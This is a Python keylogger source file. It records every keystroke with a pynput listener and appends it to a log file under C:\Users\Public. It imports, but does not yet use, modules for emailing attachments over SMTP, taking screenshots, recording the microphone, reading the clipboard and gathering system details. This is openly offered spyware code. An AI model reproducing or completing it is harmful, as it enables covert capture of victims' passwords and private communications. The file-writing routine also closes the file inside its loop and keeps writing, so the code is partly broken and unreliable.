# Libraries
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
from pynput.keyboard import Key, Listener 
from requests import get
from cryptography.fernet import Fernet
from multiprocessing import Process, freeze_support
from PIL import ImageGrab
from scipy.io.wavfile import write

import smtplib
import socket
import platform
try:
    import win32clipboard # type: ignore
except ImportError:
    print("win32clipboard module not found. Please install it using 'pip install pywin32'")
import time
import os
import sounddevice as sd
import getpass
import keyboard


keys_infor = "key_log.txt"
file_path = "C:\\Users\\Public\\Public Keylogger" # Default path
extend = "\\"

count = 0
keys =[]

def on_press(key):
    global keys, count
    print(key)
    keys.append(key)
    count += 1

    if count >= 1:
        count = 0
        write_file(keys)
        keys = []


def write_file(keys):
    with open(file_path + extend + keys_infor, "a") as f:
        for key in keys:
            k = str(key).replace("'", "")
            if k.find("space") > 0:
                f.write('\n')
                f.close()
            elif k.find("Key") == -1:
                f.write(k)

def on_release(key):
    if key == Key.esc:
        return False
    

def start():
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

def show_path_to_log():
    print("Path to log file: ", file_path + extend + keys_infor)

def set_log_file_path(path):
    global file_path
    file_path = path
    print("Log file path set to: ", file_path)